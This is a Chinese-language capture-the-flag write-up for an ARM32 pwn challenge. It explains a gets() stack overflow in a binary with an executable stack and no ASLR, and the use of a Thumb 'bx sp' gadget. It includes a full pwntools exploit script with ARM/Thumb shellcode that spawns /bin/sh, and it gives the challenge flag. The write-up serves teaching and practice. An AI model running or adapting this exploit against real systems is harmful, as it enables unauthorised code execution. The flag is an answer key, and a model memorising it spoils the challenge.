# ARM32

## 题目简述

目标是由 `qemu-arm` 运行的 32 位 ARM EABI5 ELF。二进制为 No PIE、No Canary、NX disabled、Partial RELRO，题目环境还关闭了 ASLR。`vuln()` 对 `0x20` 字节栈缓冲区调用 `gets()`，程序内另有 `bx sp` 与 `blx sp` 指令可作为跳板。

由于栈可执行，最短利用路线是覆盖保存的返回地址到 `bx sp`，让控制流跳到紧随返回地址放置的 ARM/Thumb shellcode。

## 解题过程

ARM32 函数栈帧中，`0x20` 字节缓冲区后还有 4 字节保存的帧指针，因此到保存的 LR 共需：

```text
0x20 + 4 = 0x24 bytes
```

官方 solver 在缓冲区开头放置 `/bin/sh\0`，将 saved LR 覆盖为 `bx sp` gadget。该 gadget 位于 Thumb 指令流中，所以写入地址时必须把最低位置 1；ARM 使用地址最低位选择 ARM/Thumb 状态，这个 `+1` 不是普通地址偏移。

返回到 gadget 时，`sp` 正好指向后续 shellcode。shellcode先在 ARM 状态下跳入 Thumb 状态，以使用更紧凑、容易避开空字节的 16 位指令，再构造 `execve("/bin/sh", NULL, NULL)`：

```python
#!/usr/bin/env python3
import sys

from pwn import ELF, asm, context, flat, remote


elf = ELF("./arm32", checksec=False)
context.binary = elf

bx_sp = next(
    elf.search(asm("bx sp", arch="thumb"), executable=True)
) + 1

payload = flat(
    b"/bin/sh\x00",
    b"A" * (0x24 - 8),
    bx_sp,
)

context.clear(arch="arm")
payload += asm(
    r"""
    .code 32
    add r3, pc, #1
    bx r3

    .code 16
    sub r0, pc, #0x34
    eors r1, r1
    eors r2, r2
    movs r7, #11
    svc #1
    mov r5, r5
    """
)

assert b"\n" not in payload
io = remote(sys.argv[1], int(sys.argv[2]))
io.recvline()
io.sendline(payload)
io.interactive()
```

`sub r0, pc, #0x34` 根据当前 PC 位置回指缓冲区开头的 `/bin/sh`；`r7=11` 是 ARM EABI 的 `execve` 系统调用号。利用成功后得到：

```text
shellmates{ARM_Xpl0it$_4r3_C00l}
```

## 方法总结

本题的关键是 ARM/Thumb 互操作，而不是简单地把 x86 栈溢出脚本换一个架构参数。ARM32 通常把返回地址保存在 LR，函数返回时再恢复到 PC；Thumb gadget 地址必须设置最低位，PC 相对寻址还要考虑流水线导致的 PC 提前量。

看到 No Canary、NX disabled、可执行栈和 `gets()` 时，可以优先寻找 `bx sp`/`blx sp` 跳板并直接执行 shellcode。实际复现必须使用目标架构对应的汇编上下文和字节序，同时检查逐行输入协议是否会被 payload 中的换行字节提前截断。
